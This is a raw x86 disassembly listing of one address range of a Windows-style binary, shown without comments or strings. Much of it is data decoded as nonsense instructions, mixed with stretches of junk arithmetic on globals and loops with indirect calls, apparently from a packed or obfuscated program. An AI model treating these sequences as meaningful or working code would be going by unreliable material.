  40b829:	bound  ecx,QWORD PTR [esi+esi*8]
  40b82c:	push   ecx
  40b82d:	into   
  40b82e:	lods   eax,DWORD PTR ds:[esi]
  40b82f:	retf   0xc852
  40b832:	xchg   edi,eax
  40b833:	aad    0x9a
  40b835:	cmp    ax,0xbf2
  40b839:	outs   dx,DWORD PTR ds:[esi]
  40b83a:	ins    DWORD PTR es:[edi],dx
  40b83b:	sub    BYTE PTR [ecx],0x22
  40b83e:	out    dx,al
  40b83f:	sbb    al,0x96
  40b841:	imul   ecx,DWORD PTR [esi+0x3],0xd46719c3
  40b848:	jp     0x40b840
  40b84a:	mov    esp,DWORD PTR [eax-0x77]
  40b84d:	aam    0x87
  40b84f:	and    bl,bh
  40b851:	test   ch,0x45
  40b854:	out    dx,al
  40b855:	pusha  
  40b856:	mov    edi,0xe9a7f5e6
  40b85b:	xchg   BYTE PTR [ecx-0xa],al
  40b85e:	gs loope 0x40b88f
  40b861:	ret    
  40b862:	stc    
  40b863:	out    0x8a,al
  40b865:	push   ss
  40b866:	sar    DWORD PTR [ecx-0x1f],1
  40b869:	inc    ebx
  40b86a:	and    al,0xd3
  40b86c:	adc    DWORD PTR [esi+0x74],ebp
  40b86f:	mov    esi,0xafcfb574
  40b874:	mov    bl,BYTE PTR [edi]
  40b876:	mov    edi,0x3973ff45
  40b87b:	sbb    cl,bl
  40b87d:	pop    es
  40b87e:	(bad)  
  40b87f:	pop    eax
  40b880:	sbb    bl,BYTE PTR [eax-0x187a009d]
  40b886:	adc    BYTE PTR [ebp+eiz*4+0x51],bl
  40b88a:	adc    BYTE PTR [esi],dh
  40b88c:	out    0x8,al
  40b88e:	imul   ebx,DWORD PTR [edi-0x20],0xcb913bd1
  40b895:	enter  0xe446,0x24
  40b899:	hlt    
  40b89a:	sti    
  40b89b:	mov    ch,0xc3
  40b89d:	or     DWORD PTR [ebp-0x3f],edi
  40b8a0:	mov    eax,ds:0x14c16002
  40b8a5:	push   cs
  40b8a6:	adc    al,0x31
  40b8a8:	out    dx,eax
  40b8a9:	inc    edx
  40b8aa:	in     al,0xf7
  40b8ac:	xor    edx,DWORD PTR [ecx]
  40b8ae:	icebp  
  40b8af:	sub    BYTE PTR [esi-0x55],bh
  40b8b2:	cld    
  40b8b3:	lea    edi,[edi-0x646697cf]
  40b8b9:	mov    edx,0x18a30dba
  40b8be:	pop    edi
  40b8bf:	test   BYTE PTR [edi+0x19],ah
  40b8c2:	dec    ecx
  40b8c3:	int    0x97
  40b8c5:	popa   
  40b8c6:	mov    edi,esp
  40b8c8:	sar    DWORD PTR [eax],cl
  40b8ca:	call   0xe13c0f21
  40b8cf:	push   es
  40b8d0:	mov    ebp,0xe2d5610f
  40b8d5:	or     edi,esp
  40b8d7:	(bad)  
  40b8d8:	jb     0x40b85c
  40b8da:	or     DWORD PTR [esi],eax
  40b8dc:	jmp    0x1aa57c4e
  40b8e1:	dec    edi
  40b8e2:	addr16 daa 
  40b8e4:	bound  eax,QWORD PTR [esi]
  40b8e6:	mov    ch,0x97
  40b8e8:	adc    eax,DWORD PTR [edi+0x119c2f5b]
  40b8ee:	stos   DWORD PTR es:[edi],eax
  40b8ef:	xchg   DWORD PTR [edx+edx*4-0x37],edx
  40b8f3:	cmc    
  40b8f4:	into   
  40b8f5:	arpl   sp,dx
  40b8f7:	repz ret 0x8954
  40b8fb:	jne    0x40b8e9
  40b8fd:	sbb    ecx,DWORD PTR ds:0x430546
  40b903:	mov    DWORD PTR [ebp-0x8],esi
  40b906:	xor    ecx,DWORD PTR ds:0x430496
  40b90c:	mov    ecx,DWORD PTR [ebp-0x18]
  40b90f:	neg    DWORD PTR ds:0x43049e
  40b915:	xor    ecx,eax
  40b917:	sbb    DWORD PTR ds:0x4304a6,0x1292
  40b921:	xor    edi,edi
  40b923:	add    ecx,ebx
  40b925:	mov    DWORD PTR [ebp-0x20],ecx
  40b928:	mov    DWORD PTR ds:0x42ee28,edi
  40b92e:	mov    eax,DWORD PTR [ebp-0x20]
  40b931:	je     0x40c70d
  40b937:	xor    DWORD PTR ds:0x42ee2c,edi
  40b93d:	mov    eax,DWORD PTR [ebp-0x4]
  40b940:	xor    eax,0x7510856
  40b945:	xor    DWORD PTR ds:0x42ee20,0x27f1
  40b94f:	jmp    0x40baad
  40b954:	mov    edx,ds
  40b956:	inc    edi
  40b957:	aam    0x59
  40b959:	push   ebp
  40b95a:	mov    ebp,0x1f44e87a
  40b95f:	and    BYTE PTR [esi+0x5f],0xe5
  40b963:	(bad)  
  40b964:	ds clc 
  40b966:	jle    0x40b9e6
  40b968:	aas    
  40b969:	jg     0x40b9e9
  40b96b:	jle    0x40b935
  40b96d:	mov    eax,0x82e4970e
  40b972:	inc    ebx
  40b973:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b974:	cmp    eax,0xd240fa8b
  40b979:	sbb    al,0x44
  40b97b:	or     esi,DWORD PTR [ecx+0x5c00a1b1]
  40b981:	mov    bl,0x1f
  40b983:	pop    edx
  40b984:	mov    cs,ecx
  40b986:	pop    eax
  40b987:	or     eax,0xb69d1d39
  40b98c:	pop    ecx
  40b98d:	int    0x6a
  40b98f:	add    WORD PTR [edi-0x77],si
  40b993:	pop    eax
  40b994:	jnp    0x40b956
  40b996:	mov    dl,0x44
  40b998:	xor    edi,esp
  40b99a:	push   0x7f
  40b99c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b99d:	repz or dl,dl
  40b9a0:	in     al,dx
  40b9a1:	add    al,0xd7
  40b9a3:	(bad)  
  40b9a4:	in     eax,dx
  40b9a5:	inc    edi
  40b9a6:	adc    ah,bl
  40b9a8:	stos   DWORD PTR es:[edi],eax
  40b9a9:	push   ebx
  40b9aa:	pop    es
  40b9ab:	cmc    
  40b9ac:	popf   
  40b9ad:	inc    ebx
  40b9ae:	es stc 
  40b9b0:	mov    ds:0xf1243678,al
  40b9b5:	adc    eax,0x5c05ecb8
  40b9ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b9bb:	rol    BYTE PTR [ecx-0x2c65ac58],1
  40b9c1:	test   al,0x42
  40b9c3:	mov    esi,0x3b923cde
  40b9c8:	jl     0x40b94f
  40b9ca:	pop    ss
  40b9cb:	pop    ss
  40b9cc:	or     BYTE PTR gs:[ebx+0x6f],bh
  40b9d0:	sub    al,0xc4
  40b9d2:	mov    al,ds:0xe9ac82f6
  40b9d7:	sbb    edi,ecx
  40b9d9:	cmp    bl,bl
  40b9db:	and    al,0xaf
  40b9dd:	(bad)  
  40b9df:	sub    edi,DWORD PTR [eax]
  40b9e1:	into   
  40b9e2:	nop
  40b9e3:	outs   dx,DWORD PTR ds:[esi]
  40b9e4:	mov    ah,0xd6
  40b9e6:	aas    
  40b9e7:	mov    ds:0x68beeb79,al
  40b9ec:	add    al,0x18
  40b9ee:	out    dx,eax
  40b9ef:	shl    BYTE PTR [edx+0x62],1
  40b9f2:	je     0x40ba12
  40b9f4:	shl    DWORD PTR [ecx-0x7a9d7590],cl
  40b9fa:	pop    es
  40b9fb:	dec    eax
  40b9fc:	out    0x80,al
  40b9fe:	rcl    BYTE PTR [ecx],1
  40ba00:	jmp    0x8335:0xbfcf486a
  40ba07:	mov    ch,0xf1
  40ba09:	jle    0x40b9bc
  40ba0b:	(bad)  
  40ba0c:	shl    ch,cl
  40ba0e:	hlt    
  40ba0f:	xchg   ecx,eax
  40ba10:	loopne 0x40ba4a
  40ba12:	repnz add esi,DWORD PTR [ebx+eax*2]
  40ba16:	repz rcr BYTE PTR [ebx+0x68d1c45b],0xa6
  40ba1e:	daa    
  40ba1f:	xchg   BYTE PTR [eax+eiz*4+0x617cfaef],dh
  40ba26:	jmp    0x4f3a585a
  40ba2b:	sbb    DWORD PTR [esi-0x26],esi
  40ba2e:	cmp    esp,DWORD PTR [edi-0x1e]
  40ba31:	or     al,0x16
  40ba33:	outs   dx,DWORD PTR ds:[esi]
  40ba34:	(bad)  
  40ba35:	cmp    DWORD PTR [eax+eiz*8+0x3358fb91],ecx
  40ba3c:	daa    
  40ba3d:	jp     0x40b9c0
  40ba3f:	fmul   DWORD PTR ds:0x42e076d8
  40ba45:	(bad)  
  40ba46:	cli    
  40ba47:	stos   DWORD PTR es:[edi],eax
  40ba48:	out    dx,al
  40ba49:	int    0x6f
  40ba4b:	cmp    al,0x99
  40ba4d:	outs   dx,DWORD PTR ds:[esi]
  40ba4e:	repz fucomip st,st(1)
  40ba51:	fst    DWORD PTR [ecx+eiz*4+0x5]
  40ba55:	into   
  40ba56:	jb     0x40ba3e
  40ba58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ba59:	mov    DWORD PTR [ebx-0x5203c69b],0x3d8ae13a
  40ba63:	lahf   
  40ba64:	aas    
  40ba65:	push   0x24
  40ba67:	mov    DWORD PTR [ebx-0x1f],ebp
  40ba6a:	ja     0x40bae5
  40ba6c:	mov    ecx,0x5d54e3e0
  40ba71:	jns    0x40bac6
  40ba73:	nop
  40ba74:	test   eax,0x5f6d5945
  40ba79:	sbb    esp,DWORD PTR [eax+edx*4+0x52cf5dc0]
  40ba80:	or     bh,0x31
  40ba83:	cmp    ch,BYTE PTR [edx+ebp*8]
  40ba86:	mov    ebx,DWORD PTR [edx-0x75186cea]
  40ba8c:	std    
  40ba8d:	mov    bh,0x33
  40ba8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba90:	inc    eax
  40ba91:	pop    edx
  40ba92:	fidivr DWORD PTR [edx]
  40ba94:	mov    cl,0xe8
  40ba96:	or     eax,0x48b42e98
  40ba9b:	jge    0x40ba73
  40ba9d:	xor    DWORD PTR [ecx+0x4bbcbc3],esi
  40baa3:	int    0xd
  40baa5:	in     eax,dx
  40baa6:	jl     0x40bacb
  40baa8:	xchg   ebx,eax
  40baa9:	imul   eax,DWORD PTR [esi],0xffffffc4
  40baac:	arpl   WORD PTR [ebx],ax
  40baae:	ret    
  40baaf:	mov    DWORD PTR ds:0x42ee20,0x3d16
  40bab9:	cmp    edi,eax
  40babb:	mov    DWORD PTR ds:0x430496,0x64f1
  40bac5:	jne    0x40c296
  40bacb:	or     DWORD PTR ds:0x42ee28,0x42ee14
  40bad5:	push   DWORD PTR [ebp+0x8]
  40bad8:	call   0x40a1ba
  40badd:	mov    DWORD PTR [ebp-0x20],eax
  40bae0:	mov    eax,DWORD PTR [ebp-0x4]
  40bae3:	mov    ecx,DWORD PTR [ebp-0x20]
  40bae6:	and    DWORD PTR ds:0x42ee1c,0x0
  40baf0:	mov    esi,DWORD PTR ds:0x42ee1c
  40baf6:	inc    esi
  40baf7:	mov    DWORD PTR ds:0x42ee1c,esi
  40bafd:	cmp    DWORD PTR ds:0x42ee1c,0x22
  40bb04:	jne    0x40bb1b
  40bb0a:	push   DWORD PTR [ebp-0x1c]
  40bb0d:	push   DWORD PTR [ebp-0x24]
  40bb10:	push   0x6795
  40bb15:	call   DWORD PTR ds:0x42ebd4
  40bb1b:	cmp    DWORD PTR ds:0x42ee1c,0x1d
  40bb22:	jb     0x40baf0
  40bb28:	mov    esi,DWORD PTR ds:0x430556
  40bb2e:	xor    DWORD PTR ds:0x4304b6,esi
  40bb34:	mov    esi,0x7510856
  40bb39:	add    DWORD PTR ds:0x4304b2,0x43049a
  40bb43:	xor    eax,esi
  40bb45:	jmp    0x40bca3
  40bb4a:	jns    0x40bb9f
  40bb4c:	mov    ah,0x6a
  40bb4e:	pop    esp
  40bb4f:	ins    DWORD PTR es:[edi],dx
  40bb50:	jns    0x40bbb7
  40bb52:	lods   al,BYTE PTR ds:[esi]
  40bb53:	iret   
  40bb54:	loopne 0x40bbad
  40bb56:	cdq    
  40bb57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb58:	pop    edx
  40bb59:	ud0    edi,ecx
  40bb5c:	jle    0x40bbdc
  40bb5e:	aas    
  40bb5f:	jg     0x40bbdf
  40bb61:	jle    0x40bb9a
  40bb63:	jp     0x40bb61
  40bb65:	out    0x8e,al
  40bb67:	lock dec ebx
  40bb69:	adc    ah,BYTE PTR [ebx]
  40bb6b:	aad    0x41
  40bb6d:	mov    WORD PTR [ecx+0x3c],ss
  40bb70:	sbb    eax,0x7b2f2a1
  40bb75:	add    DWORD PTR [esi],ecx
  40bb77:	cmp    BYTE PTR [ebx+esi*4],bl
  40bb7a:	adc    DWORD PTR [ecx-0x45e22003],ebp
  40bb80:	out    dx,al
  40bb81:	jo     0x40bb13
  40bb83:	int3   
  40bb84:	or     ebp,0x13c62097
  40bb8a:	mov    fs,WORD PTR [eax+0xf414b72]
  40bb90:	sbb    BYTE PTR [esi+0x53],ah
  40bb93:	addr16 pop ebx
  40bb95:	cmp    BYTE PTR [edi-0x6773cd9],dl
  40bb9b:	std    
  40bb9c:	or     eax,0x8d451b68
  40bba1:	aas    
  40bba2:	sub    dh,cl
  40bba4:	xlat   BYTE PTR ds:[ebx]
  40bba5:	mov    al,ds:0x53504540
  40bbaa:	js     0x40bba7
  40bbac:	mov    ebx,edx
  40bbae:	xchg   ebp,eax
  40bbaf:	dec    edi
  40bbb0:	inc    edi
  40bbb1:	stos   DWORD PTR es:[edi],eax
  40bbb2:	jge    0x40bc08
  40bbb4:	push   0x6e
  40bbb6:	push   cs
  40bbb7:	pop    DWORD PTR [edx+0xf]
  40bbba:	int3   
  40bbbb:	push   ecx
  40bbbc:	mov    esi,esp
  40bbbe:	add    bh,al
  40bbc0:	mov    ch,BYTE PTR [edi]
  40bbc2:	add    ah,ch
  40bbc4:	inc    ebp
  40bbc5:	popa   
  40bbc6:	xor    DWORD PTR [ecx+0x6ff19228],ebx
  40bbcc:	aam    0x0
  40bbce:	or     BYTE PTR [eax-0x7f7f4470],bh
  40bbd4:	rol    BYTE PTR [ecx-0x60],1
  40bbd7:	and    al,0x4a
  40bbd9:	jle    0x40bc34
  40bbdb:	sub    BYTE PTR [ecx-0x29],bl
  40bbde:	mov    esp,0x1f3910cf
  40bbe3:	dec    eax
  40bbe4:	xchg   ebx,eax
  40bbe5:	(bad)  
  40bbe6:	sub    dl,BYTE PTR [ecx]
  40bbe8:	and    dh,0x10
  40bbeb:	jno    0x40bb71
  40bbed:	inc    eax
  40bbee:	lea    eax,[ebp+0xa17ec4e]
  40bbf4:	in     eax,dx
  40bbf5:	cwde   
  40bbf6:	sbb    bh,bh
  40bbf8:	pop    esi
  40bbf9:	test   eax,0x89cccf4f
  40bbfe:	push   ds
  40bbff:	mov    ebx,0x17550618
  40bc04:	inc    ecx
  40bc05:	xlat   BYTE PTR ds:[ebx]
  40bc06:	not    edi
  40bc08:	jnp    0x40bbe2
  40bc0a:	adc    al,0x72
  40bc0c:	popa   
  40bc0d:	mov    al,0x2e
  40bc0f:	mov    eax,0xe9c413d8
  40bc14:	div    DWORD PTR [edx-0x5ab6ecce]
  40bc1a:	xor    dl,cl
  40bc1c:	sahf   
  40bc1d:	ficomp DWORD PTR [ebp+0x70476a3f]
  40bc23:	shr    DWORD PTR [esi],0xaf
  40bc26:	add    BYTE PTR [ebp+0x6eb281fa],al
  40bc2c:	pop    es
  40bc2d:	and    al,0x3
  40bc2f:	out    0xb5,eax
  40bc31:	stos   BYTE PTR es:[edi],al
  40bc32:	jle    0x40bbf3
  40bc34:	cmp    esi,DWORD PTR [eax+0x31c56637]
  40bc3a:	mov    ch,BYTE PTR [ebp-0x3c]
  40bc3d:	jbe    0x40bbf3
  40bc3f:	inc    ebp
  40bc40:	je     0x40bc63
  40bc42:	cld    
  40bc43:	mov    edx,0xbfb454d0
  40bc48:	add    cl,dl
  40bc4a:	popa   
  40bc4b:	repz pushf 
  40bc4d:	push   ecx
  40bc4e:	cwde   
  40bc4f:	sub    edi,DWORD PTR [ebp+0x1c]
  40bc52:	out    0x22,al
  40bc54:	enter  0xab32,0x59
  40bc58:	sbb    al,0x7c
  40bc5a:	es ins DWORD PTR es:[edi],dx
  40bc5c:	rcl    DWORD PTR [edi-0x6c18aecc],1
  40bc62:	and    ah,BYTE PTR [ecx-0x36]
  40bc65:	xor    BYTE PTR [ecx+0x1ae9e361],cl
  40bc6b:	aad    0x25
  40bc6d:	mov    ch,0x22
  40bc6f:	xchg   ecx,eax
  40bc70:	adc    eax,0x2a8ff165
  40bc75:	cdq    
  40bc76:	and    DWORD PTR [edi],ecx
  40bc78:	adc    BYTE PTR [esi],bh
  40bc7a:	lods   eax,DWORD PTR ds:[esi]
  40bc7b:	in     al,dx
  40bc7c:	ds popf 
  40bc7e:	(bad)  
  40bc7f:	xchg   ecx,eax
  40bc80:	pop    DWORD PTR [eax-0x4a]
  40bc83:	cdq    
  40bc84:	lahf   
  40bc85:	int    0xb6
  40bc87:	add    eax,0x68b0f1e1
  40bc8c:	sub    BYTE PTR [edx],bl
  40bc8e:	fwait
  40bc8f:	xchg   ebp,eax
  40bc90:	cld    
  40bc91:	jg     0x40bcd3
  40bc93:	sbb    ebp,ebp
  40bc95:	(bad)  
  40bc96:	sbb    al,0x2
  40bc98:	lahf   
  40bc99:	cld    
  40bc9a:	ror    BYTE PTR [esi],1
  40bc9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc9d:	sub    al,BYTE PTR [ebp+0x48348c8c]
  40bca3:	add    eax,ebx
  40bca5:	cmp    ecx,eax
  40bca7:	mov    DWORD PTR ds:0x430552,0x373b
  40bcb1:	je     0x40c6f1
  40bcb7:	sbb    DWORD PTR ds:0x43054e,0x42ee30
  40bcc1:	push   DWORD PTR [ebp-0x20]
  40bcc4:	and    DWORD PTR ds:0x4304be,0x430546
  40bcce:	push   DWORD PTR [ebp+0x8]
  40bcd1:	call   0x40a7ab
  40bcd6:	and    DWORD PTR ds:0x4304c2,0x0
  40bce0:	jmp    0x40bcf2
  40bce5:	mov    ecx,DWORD PTR ds:0x4304c2
  40bceb:	inc    ecx
  40bcec:	mov    DWORD PTR ds:0x4304c2,ecx
  40bcf2:	cmp    DWORD PTR ds:0x4304c2,0x1e
  40bcf9:	jae    0x40bd40
  40bcff:	cmp    DWORD PTR ds:0x4304c2,0xd
  40bd06:	jne    0x40bd1f
  40bd0c:	push   DWORD PTR [ebp-0xc]
  40bd0f:	push   0x4304a2
  40bd14:	push   0x2a1f
  40bd19:	call   DWORD PTR ds:0x42ea2c
  40bd1f:	cmp    DWORD PTR ds:0x4304c2,0xc
  40bd26:	jne    0x40bd3b
  40bd2c:	xor    ecx,ecx
  40bd2e:	add    ecx,DWORD PTR ds:0x4304c2
  40bd34:	inc    ecx
  40bd35:	mov    DWORD PTR ds:0x4304c2,ecx
  40bd3b:	jmp    0x40bce5
  40bd40:	mov    DWORD PTR [ebp-0x14],eax
  40bd43:	xor    DWORD PTR ds:0x42e772,0x3e11
  40bd4d:	mov    eax,DWORD PTR [ebp-0x4]
  40bd50:	add    ecx,DWORD PTR ds:0x430496
  40bd56:	mov    ecx,DWORD PTR [ebp-0x14]
  40bd59:	xor    eax,esi
  40bd5b:	or     DWORD PTR ds:0x43055a,0x430552
  40bd65:	add    eax,ebx
  40bd67:	cmp    ecx,eax
  40bd69:	mov    DWORD PTR ds:0x42ee10,0x41d
  40bd73:	je     0x40c6f1
  40bd79:	add    eax,ecx
  40bd7b:	mov    eax,DWORD PTR [ebp-0x14]
  40bd7e:	mov    DWORD PTR ds:0x4304b2,0x19
  40bd88:	cmp    DWORD PTR ds:0x4304b2,0x0
  40bd8f:	je     0x40bdbf
  40bd95:	cmp    DWORD PTR ds:0x4304b2,0x1b
  40bd9c:	jne    0x40bdad
  40bda2:	push   0x2712
  40bda7:	call   DWORD PTR ds:0x42ea30
  40bdad:	mov    ecx,DWORD PTR ds:0x4304b2
  40bdb3:	dec    ecx
  40bdb4:	mov    DWORD PTR ds:0x4304b2,ecx
  40bdba:	jmp    0x40bd88
  40bdbf:	mov    eax,DWORD PTR [eax+0x18]
  40bdc2:	sub    ecx,DWORD PTR ds:0x43055a
  40bdc8:	mov    DWORD PTR [ebp-0x20],eax
  40bdcb:	jmp    0x40bf29
  40bdd0:	fld    QWORD PTR [ebx-0x66]
  40bdd3:	xor    bl,BYTE PTR [ebx+ecx*8+0x503d5d5d]
  40bdda:	cmp    al,0x3b
  40bddc:	add    edx,DWORD PTR [ecx-0x54fc314]
  40bde2:	jle    0x40be62
  40bde4:	aas    
  40bde5:	jg     0x40be65
  40bde7:	jle    0x40be65
  40bde9:	mov    edi,0x57d7546b
  40bdee:	pusha  
  40bdef:	jmp    0x8b7f:0x46d151aa
  40bdf6:	xchg   esp,eax
  40bdf7:	adc    ch,BYTE PTR [esi]
  40bdf9:	and    ebx,edi
  40bdfb:	leave  
  40bdfc:	daa    
  40bdfd:	cwde   
  40bdfe:	out    dx,eax
  40bdff:	rol    bl,cl
  40be01:	outs   dx,DWORD PTR ds:[esi]
  40be02:	clc    
  40be03:	sbb    DWORD PTR [ecx-0xbfcc190],0x79
  40be0a:	dec    esp
  40be0b:	pop    ds
  40be0c:	movzx  ebp,BYTE PTR [edx-0x3b]
  40be10:	rcr    eax,cl
  40be12:	xor    ebx,DWORD PTR ds:0xac9c830
  40be18:	popf   
  40be19:	mov    al,0x96
  40be1b:	call   ebx
  40be1d:	test   BYTE PTR [ecx],cl
  40be1f:	out    dx,al
  40be20:	jg     0x40be9f
  40be22:	cmp    ebp,DWORD PTR [ebp+0x47]
  40be25:	popa   
  40be26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be27:	add    BYTE PTR [ebp-0x77],ch
  40be2a:	jmp    0x40be04
  40be2c:	in     eax,0xf9
  40be2e:	inc    ebp
  40be2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be30:	xchg   edx,eax
  40be31:	push   esi
  40be32:	jmp    0x40be1d
  40be34:	or     ebp,0x29ed3061
  40be3a:	xor    dh,BYTE PTR [esi+0x42]
  40be3d:	jno    0x40be97
  40be3f:	or     BYTE PTR [ebx+0x11],bh
  40be42:	push   ss
  40be43:	cmp    eax,0x7d9b71be
  40be48:	test   al,0xb9
  40be4a:	imul   BYTE PTR gs:[ecx-0x5c66797d]
  40be51:	ret    
  40be52:	mov    ah,BYTE PTR [edi+0x75be532f]
  40be58:	je     0x40bdf2
  40be5a:	fsub   QWORD PTR [eax-0xd]
  40be5d:	add    al,bl
  40be5f:	push   0x6
  40be61:	sub    ch,BYTE PTR [edi-0x7c243766]
  40be67:	fistp  WORD PTR [edx-0x32]
  40be6a:	leave  
  40be6b:	adc    edx,DWORD PTR ds:0xe92ea73c
  40be71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be72:	dec    esi
  40be73:	std    
  40be74:	pop    ebx
  40be75:	(bad)  [esi+0x100a1838]
  40be7b:	and    al,0x1d
  40be7d:	sub    edi,DWORD PTR [ecx+0x3e]
  40be80:	cmp    al,0xf6
  40be82:	or     al,BYTE PTR [edx-0x7265e083]
  40be88:	cmp    edx,DWORD PTR [edi-0x2c]
  40be8b:	es dec esi
  40be8d:	scas   eax,DWORD PTR es:[edi]
  40be8e:	xchg   DWORD PTR [edi+0x26b14676],esi
  40be94:	push   es
  40be95:	bound  esp,QWORD PTR [edx]
  40be97:	mov    ah,BYTE PTR [ecx]
  40be99:	loope  0x40be82
  40be9b:	mul    DWORD PTR [ebp+0x10]
  40be9e:	adc    edx,DWORD PTR [edi]
  40bea0:	fwait
  40bea1:	rol    bl,cl
  40bea3:	xchg   ebx,eax
  40bea4:	add    al,BYTE PTR [ebp+0x7211c30]
  40beaa:	inc    esp
  40beab:	mov    dh,bh
  40bead:	fist   WORD PTR [eax-0x56]
  40beb0:	ret    
  40beb1:	js     0x40befb
  40beb3:	pop    ss
  40beb4:	jg     0x40bea8
  40beb6:	sbb    BYTE PTR [edx+0x69],dl
  40beb9:	(bad)  
  40beba:	or     eax,0xcf788abe
  40bebf:	gs mov al,0x92
  40bec2:	fisub  DWORD PTR [esi+0xb]
  40bec5:	sub    BYTE PTR [eax-0x91412fb],bl
  40becb:	mov    ebx,0xefdd7108
  40bed0:	into   
  40bed1:	mul    BYTE PTR ds:0x36dc484f
  40bed7:	mov    ecx,0x9ce23066
  40bedc:	mov    dh,0xfa
  40bede:	cmp    eax,0xa2d480eb
  40bee3:	add    BYTE PTR ds:0xab0314e0,dh
  40bee9:	aam    0x40
  40beeb:	xacquire xchg BYTE PTR [edi+0x6a],ah
  40beef:	mov    dl,0x43
  40bef1:	pop    esp
  40bef2:	and    al,0x9
  40bef4:	in     eax,dx
  40bef5:	gs mov ecx,0x674c638e
  40befb:	push   edi
  40befc:	stos   DWORD PTR es:[edi],eax
  40befd:	adc    BYTE PTR [esi-0x7035f3e7],bl
  40bf03:	loop   0x40be8e
  40bf05:	test   BYTE PTR [eax+edi*2+0xc],bh
  40bf09:	pop    edx
  40bf0a:	sub    edi,DWORD PTR [edi]
  40bf0c:	loope  0x40bf65
  40bf0e:	xor    al,0x18
  40bf10:	fsubr  QWORD PTR [edi+0x7278036a]
  40bf16:	shl    DWORD PTR [eax+eax*8],cl
  40bf19:	adc    BYTE PTR [ebx-0x4fcd9eea],al
  40bf1f:	test   eax,0x6cfdcb5e
  40bf24:	pop    esi
  40bf25:	dec    ecx
  40bf26:	fmul   DWORD PTR [ecx]
  40bf28:	jo     0x40beb5
  40bf2a:	inc    ebp
  40bf2b:	in     al,dx
  40bf2c:	mov    ecx,DWORD PTR [ebp+0x8]
  40bf2f:	sbb    DWORD PTR ds:0x4304a6,0xe94
  40bf39:	jmp    0x40c097
  40bf3e:	fmul   QWORD PTR [edi+0x7d6d4fad]
  40bf44:	cld    
  40bf45:	popf   
  40bf46:	mov    dh,0x46
  40bf48:	(bad)  
  40bf49:	scas   al,BYTE PTR es:[edi]
  40bf4a:	adc    edx,0xfc71375f
  40bf50:	jle    0x40bfd0
  40bf52:	aas    
  40bf53:	jg     0x40bfd3
  40bf55:	jle    0x40bfcd
  40bf57:	jb     0x40bfd2
  40bf59:	xor    DWORD PTR [esp+edi*4+0x2da85531],edx
  40bf60:	xor    BYTE PTR [ebx+0x75],bh
  40bf63:	adc    DWORD PTR [eax-0x4d2e23e2],ecx
  40bf69:	xchg   ebp,eax
  40bf6a:	jmp    0x40bf7d
  40bf6c:	adc    BYTE PTR [esi+ebx*8],ah
  40bf6f:	xchg   ebp,eax
  40bf70:	jmp    0xa3fd:0xc11f4e6d
  40bf77:	call   0x3a4f8e16
  40bf7c:	xor    eax,DWORD PTR [ecx+0x2c]
  40bf7f:	add    cl,BYTE PTR [edx+0x2a7cf592]
  40bf85:	mov    ah,0xc6
  40bf87:	pop    ds
  40bf88:	mov    dh,0x27
  40bf8a:	std    
  40bf8b:	in     eax,0x51
  40bf8d:	popa   
  40bf8e:	das    
  40bf8f:	cmp    dh,BYTE PTR [esi]
  40bf91:	mov    eax,ds:0xb1dc8c0e
  40bf96:	xchg   DWORD PTR [ebx-0x10],edx
  40bf99:	sub    BYTE PTR [edi],0xef
  40bf9c:	push   ebp
  40bf9d:	daa    
  40bf9e:	daa    
  40bf9f:	inc    edi
  40bfa0:	mov    ebp,0xcb1f5029
  40bfa5:	ret    
  40bfa6:	jb     0x40c01d
  40bfa8:	push   es
  40bfa9:	mov    ebx,0x63dff19
  40bfae:	mov    edx,0x2f187014
  40bfb3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bfb4:	xlat   BYTE PTR ds:[ebx]
  40bfb5:	sbb    DWORD PTR [esi+esi*4+0x8ae86a3],edx
  40bfbc:	test   dh,dl
  40bfbe:	imul   edx,DWORD PTR [edx],0x61
  40bfc1:	popf   
  40bfc2:	jmp    0xe6e9:0x4c4912cb
  40bfc9:	js     0x40bf94
  40bfcb:	sbb    bl,BYTE PTR [ecx+0x3d]
  40bfce:	jne    0x40bf89
  40bfd0:	and    ebp,DWORD PTR [edi]
  40bfd2:	push   eax
  40bfd3:	mov    bh,0x4c
  40bfd5:	jno    0x40bfc3
  40bfd7:	dec    eax
  40bfd8:	push   0x41aff2cc
  40bfdd:	inc    eax
  40bfde:	xor    ebp,edi
  40bfe0:	jg     0x40c054
  40bfe2:	test   BYTE PTR [edi-0x269e613e],0xf0
  40bfe9:	and    bh,BYTE PTR [ebx+ecx*4-0x1eeead4f]
  40bff0:	jns    0x40c06c
  40bff2:	pusha  
  40bff3:	push   cs
  40bff4:	jecxz  0x40c03a
  40bff6:	add    eax,esp
  40bff8:	pop    ecx
  40bff9:	add    al,0xac
  40bffb:	jo     0x40c03f
  40bffd:	inc    esi
  40bffe:	xor    al,BYTE PTR [esi-0x58ae52e1]
  40c004:	sub    al,0xb2
  40c006:	mov    DWORD PTR [ebp+0x6f4b4ac9],esp
  40c00c:	out    dx,al
  40c00d:	loopne 0x40c087
  40c00f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c010:	bound  esi,QWORD PTR [edx]
  40c012:	or     al,0x6
  40c014:	fiadd  DWORD PTR [edi-0x66]
  40c017:	arpl   WORD PTR [edx],ax
  40c019:	push   ebx
  40c01a:	jge    0x40c04d
  40c01c:	out    dx,al
  40c01d:	xchg   edi,eax
  40c01e:	inc    esp
  40c01f:	int    0x22
  40c021:	mov    DWORD PTR [ecx],ebx
  40c023:	fiadd  DWORD PTR [edx-0x4]
  40c026:	fwait
  40c027:	in     al,dx
  40c028:	js     0x40bfcd
  40c02a:	pushf  
  40c02b:	inc    ebx
  40c02c:	jno    0x40c031
  40c02e:	lock imul eax,DWORD PTR [esi+edi*2-0x5dfd3a7b],0xffffffc4
  40c037:	(bad)  
  40c039:	imul   ch
  40c03b:	js     0x40c03e
  40c03d:	mov    eax,0x578a6470
  40c042:	aas    
  40c043:	shl    BYTE PTR [eax],1
  40c045:	dec    esi
  40c046:	mov    bl,0x2a
